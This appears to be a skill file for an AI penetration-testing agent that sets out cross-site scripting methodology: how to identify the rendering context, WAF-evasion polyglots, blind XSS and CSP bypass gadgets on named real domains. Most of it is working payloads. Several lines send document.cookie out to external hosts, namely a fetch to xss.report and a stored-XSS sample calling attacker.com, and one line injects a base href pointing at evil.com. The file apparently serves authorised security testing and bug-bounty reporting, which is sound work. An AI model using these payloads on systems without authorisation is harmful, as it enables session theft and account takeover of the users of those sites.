---
name: web-xss-polyglot-execution
description: Comprehensive Cross-Site Scripting (XSS) assessment across reflected, stored, and DOM contexts, filter/WAF polyglot evasion, and CSP bypass techniques.
playbook: web-security
---

# Web Cross-Site Scripting (XSS) & Polyglot Execution

## Attack Vector Summary
Cross-Site Scripting (XSS) allows attackers to inject malicious client-side scripts into web applications. Execution occurs when untrusted user input is rendered directly into HTML markup, tag attributes, JavaScript code blocks, template literals, or unsafe DOM sinks without proper context-aware sanitization or output encoding.

## Tactical Heuristics & Step-by-Step Flow

### 1. Context Identification (Source to Sink)
Identify the exact rendering context before choosing a payload:

```text
1. HTML Body Context:
   <div>USER_INPUT</div> -> Payload: <svg/onload=alert(1)> or <img src=x onerror=alert(1)>

2. HTML Attribute Context:
   <input value="USER_INPUT"> -> Payload: " onfocus=alert(1) autofocus=" or "><svg onload=alert(1)>

3. JavaScript String Context:
   <script>let user = "USER_INPUT";</script> -> Payload: "-alert(1)-" or ";alert(1);//"

4. JavaScript Template Literal Context:
   <script>let msg = `Hello ${USER_INPUT}`;</script> -> Payload: ${alert(1)}

5. DOM Sink Context:
   location.hash -> innerHTML / document.write / eval / jQuery.html() / dangerouslySetInnerHTML
```

### 2. Polyglot & Filter Evasion Payloads
When standard `<script>` tags are filtered by WAFs or input sanitizers:

```html
<!-- Universal SVG Polyglot -->
"><svg/onload=confirm(1)>

<!-- HTML5 Autofocus / Event Handler -->
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<select autofocus onfocus=alert(1)>

<!-- JavaScript Context Breakouts without Quotes -->
';alert(String.fromCharCode(88,83,83))//
`${alert(document.domain)}`

<!-- JavaScript Pseudo-Protocol in href/src -->
<iframe src="javascript:alert(1)"></iframe>
<a href="javascript:alert(document.cookie)">Click</a>
```

### 3. Blind XSS & Out-of-Band Exfiltration
For delayed rendering contexts (admin portals, PDF generators, ticketing systems, audit logs):
```html
<script src="https://xss.report/c/YOUR_SUBDOMAIN"></script>
<img src=x onerror="fetch('https://xss.report/c/YOUR_SUBDOMAIN?c='+encodeURIComponent(document.cookie))">
```

### 4. DOM XSS Verification
Inspect client-side scripts for dangerous sources and sinks:
- **Sources:** `location.search`, `location.hash`, `document.referrer`, `window.name`, `postMessage` event listener.
- **Sinks:** `element.innerHTML`, `element.outerHTML`, `document.write()`, `setTimeout()`, `setInterval()`, `Function()`.

### 5. Content Security Policy (CSP) Bypass Matrix (renniepak/CSPBypass `data.tsv` & `cspbypass.com`)
When injecting payloads under strict CSP (`script-src` / `default-src`), parse the CSP policy, match every whitelisted origin domain against the **CSPBypass (`data.tsv`) corpus**, and construct matching gadget payloads:

```text
# 1. High-Frequency JSONP & Callback Endpoints (Direct Script Execution):
- accounts.google.com:
  <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
- ajax.googleapis.com:
  <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
  <div ng-app ng-csp>{{$on.constructor('alert(1)')()}}</div>
- api.twitter.com / publish.twitter.com:
  <script src="https://api.twitter.com/1/geo/id/247f43d441defc03.json?callback=alert(1)"></script>
- api.vk.com:
  <script src="https://api.vk.com/method/wall.get?callback=alert(1)"></script>
- api.yandex.ru / suggest.yandex.ru:
  <script src="https://suggest.yandex.ru/suggest-ya.cgi?callback=alert(1)"></script>
- api.github.com:
  <script src="https://api.github.com/users/octocat?callback=alert(1)"></script>
- api.flickr.com:
  <script src="https://api.flickr.com/services/rest/?method=flickr.test.echo&format=json&jsoncallback=alert(1)"></script>

# 2. Angular / Template Gadgets on CDNs (cdnjs, jsdelivr, unpkg, bootcdn, staticfile):
- cdnjs.cloudflare.com / cdn.jsdelivr.net / unpkg.com:
  <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js"></script>
  <div ng-app ng-csp>{{$eval.constructor('alert(document.domain)')()}}</div>

# 3. Microsoft Teams / Office CDN Expression Gadgets:
- statics.teams.cdn.office.net:
  {{x={"n":"".constructor.prototype};x["n"].charAt=[].join;$eval("x=alert(1)");}}

# 4. S3 Bucket / Azure Blob Angular Array Reduce Gadgets:
- *.s3.amazonaws.com / *.blob.core.windows.net / pages.nist.gov:
  foo {{ [1].reduce(value.alert, 1); }}

# 5. Base-URI Injection (Missing base-uri directive):
<base href="https://evil.com/"> -> Forces relative <script src="app.js"> to load from attacker host.

# 6. Directive Weaknesses & Policy Gaps:
- 'unsafe-inline' without nonce / hash.
- 'strict-dynamic' with whitelisted parser reading from location.hash.
- Wildcard domains (https:, data:, *).
```

## Empirical Disclosed Report Patterns & High-Risk Matrices
| Vector / Pattern | Mechanism | Empirical Pattern | Expected Evidence Marker |
|---|---|---|---|
| Reflected Attribute XSS | Unquoted/quoted attribute injection in search/filter | `q=" onfocus=alert(document.domain) autofocus="` | Browser fires alert box upon page load |
| Stored Profile/Entity XSS | DB field rendered in table or dropdown without escaping | `<svg onload=fetch('//attacker.com/?c='+document.cookie)>` | Execution triggered on view by other users |
| DOM XSS via postMessage | Window listener fails to validate `event.origin` | `window.addEventListener('message', e => { div.innerHTML = e.data })` | Exploitable via parent iframe `postMessage` |
| CSP Bypass via JSONP / CDN | Script-src allows whitelisted CDN containing JSONP endpoint | `<script src="https://cdnjs.cloudflare.com/.../angular.js"></script>` | Script execution under strict CSP policy |

## Evidence Collection & Validation Gate
- Must provide full HTTP request/response showing unescaped payload reflection or DOM sink execution trace.
- Demonstrate actual JavaScript execution (`alert(document.domain)` or PoC DOM modification).
- Evaluate against `/validate` 7-Question Validation Gate before reporting.
